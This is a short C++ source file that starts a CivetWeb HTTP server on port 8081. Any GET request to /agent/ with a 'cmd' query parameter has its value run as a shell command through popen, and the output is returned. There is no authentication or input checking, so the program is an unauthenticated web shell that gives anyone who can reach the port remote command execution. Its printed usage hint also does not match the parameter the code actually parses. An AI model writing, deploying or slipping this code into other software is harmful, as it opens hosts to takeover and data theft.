// main.cpp
#include "civetweb.h"
#include <string>
#include <iostream>
#include <sstream>
#include <cstdio>
#include <memory>
#include <array>
#include <cstring>

// Execute command and capture output
std::string exec(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
#if defined(_WIN32)
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
#else
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
#endif
    if (!pipe) {
        return "Error: Failed to execute command.";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// HTTP request handler
int request_handler(struct mg_connection* conn, void* /*cbdata*/) {
    const struct mg_request_info* req_info = mg_get_request_info(conn);

    // Check for GET method
    if (strcmp(req_info->request_method, "GET") != 0) {
        mg_printf(conn, "HTTP/1.1 405 Method Not Allowed\r\n\r\n");
        return 1;
    }

    std::string uri(req_info->local_uri);

    // Check base URL prefix "/agent/cmd"
    const std::string base_prefix = "/agent/";
    if (uri.compare(0, base_prefix.size(), base_prefix) != 0) {
        mg_printf(conn, "HTTP/1.1 404 Not Found\r\n\r\n");
        return 1;
    }

    // Parse query string for 'cmd' parameter
    const char* query = req_info->query_string ? req_info->query_string : "";
    std::string query_str(query);
    const std::string param = "cmd=";
    size_t pos = query_str.find(param);
    if (pos == std::string::npos) {
        mg_printf(conn, "HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nMissing 'cmd' parameter\n");
        return 1;
    }

    std::string cmd = query_str.substr(pos + param.length());

    // URL decode the command
    char decoded_cmd[1024];
    mg_url_decode(cmd.c_str(), cmd.length(), decoded_cmd, sizeof(decoded_cmd), 1);
    std::string decoded(decoded_cmd);

    // Execute the command
    std::string output = exec(decoded);

    // Return output
    mg_printf(conn,
              "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %zu\r\n\r\n%s",
              output.size(),
              output.c_str());

    return 1;
}
int main() {
    const char* options[] = {
        "document_root", ".",
        "listening_ports", "8081",
        nullptr
    };

    struct mg_context* ctx = mg_start(nullptr, nullptr, options);
    if (ctx == nullptr) {
        std::cerr << "Failed to start server." << std::endl;
        return 1;
    }

    // Register the request handler for specific route
    mg_set_request_handler(ctx, "/agent/", request_handler, nullptr);

    std::cout << "Server started on port 8081" << std::endl;
    std::cout << "Use URL like: http://localhost:8081/agent/cmd?=your_command" << std::endl;
    std::cout << "Press Enter to quit." << std::endl;

    getchar();

    mg_stop(ctx);
    return 0;
}

